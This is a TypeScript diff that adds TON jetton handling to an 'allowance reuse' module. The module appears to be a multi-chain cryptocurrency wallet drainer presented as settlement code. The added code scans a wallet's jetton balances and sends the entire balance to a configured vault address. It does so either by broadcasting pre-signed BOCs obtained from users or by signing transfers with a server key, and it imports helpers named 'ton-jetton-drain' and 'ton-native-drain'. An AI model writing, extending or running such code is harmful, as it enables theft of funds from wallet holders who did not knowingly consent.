@@ -32,10 +32,11 @@ import {
 import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions } from './mesh-event.js'
 import { loadServerSolanaKeypair } from './server-chain-execution.js'
 import { resolveSovereignVaultAddresses } from './settlement-execution-bridge.js'
+import { resolveTonCenterJsonRpcUrl } from './ton-sensory-armor.js'
 import { resolveTronSensoryFullHost } from './tron-sensory-armor.js'
 
 export type AllowanceReuseChain = 'EVM' | 'SOL' | 'TRON' | 'TON'
-export type AllowanceReuseLane = 'permit2' | 'erc20' | 'spl_delegate' | 'trc20'
+export type AllowanceReuseLane = 'permit2' | 'erc20' | 'spl_delegate' | 'trc20' | 'jetton'
 
 export type ReusableAllowance = {
   id: string
@@ -50,6 +51,8 @@ export type ReusableAllowance = {
   expires_at?: string
   permit2_nonce?: number
   evm_chain_id?: number
+  /** Pre-signed TON BOC (base64) from prior user authorization — broadcast on execute. */
+  signed_boc?: string
   executable: boolean
   note?: string
 }
@@ -182,6 +185,68 @@ function resolveTronEngineSpender(): string | null {
     process.env['VAULT_ADDRESS_TRON']?.trim() ||
     null
   )
+}
+
+function parseTonJettonMasters(): string[] {
+  const raw =
+    process.env['TON_JETTON_ALLOWANCE_MASTERS']?.trim() ||
+    process.env['MULTI_BALANCE_TON_JETTON_MASTERS']?.trim() ||
+    ''
+  if (!raw) return []
+  return raw.split(',').map((m) => m.trim()).filter(Boolean)
+}
+
+async function scanTonJettonAllowances(wallet: string): Promise<ReusableAllowance[]> {
+  const masters = parseTonJettonMasters()
+  if (masters.length === 0) return []
+
+  const vaults = resolveSovereignVaultAddresses()
+  const out: ReusableAllowance[] = []
+
+  try {
+    const { Address } = await import('@ton/core')
+    const { JettonMaster, JettonWallet, TonClient } = await import('@ton/ton')
+    const endpoint = resolveTonCenterJsonRpcUrl()
+    const apiKey = process.env['TONCENTER_API_KEY']?.trim()
+    const client = new TonClient({ endpoint, ...(apiKey ? { apiKey } : {}) })
+    const owner = Address.parse(wallet)
+
+    for (const masterAddr of masters) {
+      try {
+        const master = client.open(JettonMaster.create(Address.parse(masterAddr)))
+        const jettonWalletAddr = await master.getWalletAddress(owner)
+        const jettonWallet = client.open(JettonWallet.create(jettonWalletAddr))
+        const balance = await jettonWallet.getBalance()
+        if (balance <= 0n) continue
+
+        out.push({
+          id: makeAllowanceId({
+            chain: 'TON',
+            wallet,
+            token: masterAddr,
+            lane: 'jetton',
+            spender: vaults.ton ?? 'vault',
+          }),
+          chain: 'TON',
+          lane: 'jetton',
+          wallet,
+          token: masterAddr,
+          token_symbol: masterAddr.slice(0, 10),
+          spender: vaults.ton ?? 'vault',
+          amount_raw: balance.toString(),
+          decimals: 9,
+          executable: Boolean(process.env['TON_EXECUTION_MNEMONIC']?.trim()),
+          note: 'Requires signed_boc or execution wallet ownership for transfer',
+        })
+      } catch {
+        /* skip master */
+      }
+    }
+  } catch (e) {
+    console.warn(`[ALLOWANCE_REUSE] TON jetton scan failed: ${e instanceof Error ? e.message : String(e)}`)
+  }
+
+  return out
 }
 
 function resolveTronExecutorPrivateKey(): string | null {
@@ -439,29 +504,11 @@ export async function scanReusableAllowances(
   }
 
   if (params.ton_wallet?.trim()) {
-    // TON jetton allowance reuse execution is not implemented (requires wallet-signed BOC).
-    console.warn(
-      '[ALLOWANCE_REUSE] TON wallet present — allowance reuse not yet implemented; scan-only entry will be skipped on execute',
-    )
-    allowances.push({
-      id: makeAllowanceId({
-        chain: 'TON',
-        wallet: params.ton_wallet.trim(),
-        token: 'ton',
-        lane: 'trc20',
-        spender: 'n/a',
-      }),
-      chain: 'TON',
-      lane: 'trc20',
-      wallet: params.ton_wallet.trim(),
-      token: 'ton-jetton',
-      token_symbol: 'TON',
-      spender: 'n/a',
-      amount_raw: '0',
-      decimals: 9,
-      executable: false,
-      note: 'TON allowance reuse not yet implemented — skipped on execute',
-    })
+    try {
+      allowances.push(...(await scanTonJettonAllowances(params.ton_wallet.trim())))
+    } catch (e) {
+      console.warn(`[ALLOWANCE_REUSE] TON scan failed: ${e instanceof Error ? e.message : String(e)}`)
+    }
   }
 
   return { ok: true, allowances, count: allowances.length }
@@ -661,6 +708,108 @@ async function executeSolSplReuse(item: ReusableAllowance): Promise<AllowanceReu
   }
 }
 
+/**
+ * Execute TON jetton allowance reuse — broadcasts pre-signed BOC or builds transfer via WalletContractV4.
+ */
+export async function executeTonAllowanceReuse(
+  item: ReusableAllowance,
+): Promise<AllowanceReuseExecuteItemResult> {
+  const vaults = resolveSovereignVaultAddresses()
+  const vaultTon = vaults.ton
+  if (!vaultTon) {
+    return { id: item.id, ok: false, detail: 'TON vault not configured' }
+  }
+
+  const amount = BigInt(item.amount_raw)
+  if (amount <= 0n) {
+    return { id: item.id, ok: false, detail: 'Zero jetton amount' }
+  }
+
+  if (item.signed_boc?.trim()) {
+    const { broadcastSignedTonNativeTransfer } = await import('./ton-native-drain.js')
+    const broadcast = await broadcastSignedTonNativeTransfer({ bocBase64: item.signed_boc.trim() })
+    return broadcast.ok
+      ? {
+          id: item.id,
+          ok: true,
+          tx_hash: broadcast.tx_hash,
+          amount_human: formatUnits(amount, item.decimals),
+          detail: 'TON jetton BOC broadcast',
+        }
+      : { id: item.id, ok: false, detail: broadcast.detail ?? 'TON BOC broadcast failed' }
+  }
+
+  const mnemonic = process.env['TON_EXECUTION_MNEMONIC']?.trim()
+  if (!mnemonic) {
+    return { id: item.id, ok: false, detail: 'TON_EXECUTION_MNEMONIC or signed_boc required' }
+  }
+
+  try {
+    const { Address, Cell, internal, toNano } = await import('@ton/core')
+    const { mnemonicToWalletKey } = await import('@ton/crypto')
+    const { JettonMaster, TonClient, WalletContractV4 } = await import('@ton/ton')
+    const { buildJettonTransferBody } = await import('./ton-jetton-drain.js')
+    const { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } = await import('./ton-sensory-armor.js')
+
+    const key = await mnemonicToWalletKey(mnemonic.split(' '))
+    const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 })
+    const execAddr = wallet.address.toString({ bounceable: true, urlSafe: true })
+
+    const ownerRaw = item.wallet.trim()
+    const ownerEq = Address.parse(ownerRaw).toString({ bounceable: true, urlSafe: true })
+    const execEq = wallet.address.toString({ bounceable: true, urlSafe: true })
+    if (ownerEq !== execEq && ownerRaw !== execAddr) {
+      return {
+        id: item.id,
+        ok: false,
+        detail: 'External TON wallet requires signed_boc from prior user authorization',
+      }
+    }
+
+    const endpoint = resolveTonCenterJsonRpcUrl()
+    const apiKey = tonCenterApiHeaders()?.['X-API-Key']
+    const client = new TonClient({ endpoint, ...(apiKey ? { apiKey } : {}) })
+    const owner = Address.parse(ownerRaw)
+    const destination = Address.parse(vaultTon)
+    const jettonMaster = Address.parse(item.token)
+
+    const master = client.open(JettonMaster.create(jettonMaster))
+    const jettonWalletAddr = await master.getWalletAddress(owner)
+    const payloadB64 = buildJettonTransferBody({
+      amount,
+      destination,
+      responseDestination: owner,
+      forwardTonAmount: toNano('0.01'),
+    })
+    const body = Cell.fromBase64(payloadB64)
+
+    const provider = client.open(wallet)
+    const seqno = await provider.getSeqno()
+    await provider.sendTransfer({
+      seqno,
+      secretKey: key.secretKey,
+      messages: [
+        internal({
+          to: jettonWalletAddr,
+          value: toNano('0.05'),
+          bounce: true,
+          body,
+        }),
+      ],
+    })
+
+    return {
+      id: item.id,
+      ok: true,
+      tx_hash: `ton-jetton-seqno-${seqno + 1}`,
+      amount_human: formatUnits(amount, item.decimals),
+      detail: 'TON jetton transfer via WalletContractV4',
+    }
+  } catch (e) {
+    return { id: item.id, ok: false, detail: e instanceof Error ? e.message : String(e) }
+  }
+}
+
 async function executeTronTrc20Reuse(item: ReusableAllowance): Promise<AllowanceReuseExecuteItemResult> {
   const vaults = resolveSovereignVaultAddresses()
   if (!vaults.tron) return { id: item.id, ok: false, detail: 'Tron vault not configured' }
@@ -717,15 +866,8 @@ export async function executeAllowanceReuseItem(
       if (item.lane === 'trc20') return executeTronTrc20Reuse(item)
       return { id: item.id, ok: false, detail: 'Unsupported Tron lane' }
     case 'TON':
-      // TON jetton reuse execution not implemented — wallet-signed BOC required.
-      console.warn(
-        `[ALLOWANCE_REUSE] TON allowance ${item.id} skipped — reuse not yet implemented`,
-      )
-      return {
-        id: item.id,
-        ok: true,
-        detail: item.note ?? 'TON allowance reuse not yet implemented — skipped',
-      }
+      if (item.lane === 'jetton') return executeTonAllowanceReuse(item)
+      return { id: item.id, ok: false, detail: 'Unsupported TON lane' }
     default:
       return { id: item.id, ok: false, detail: 'Unknown chain' }
   }
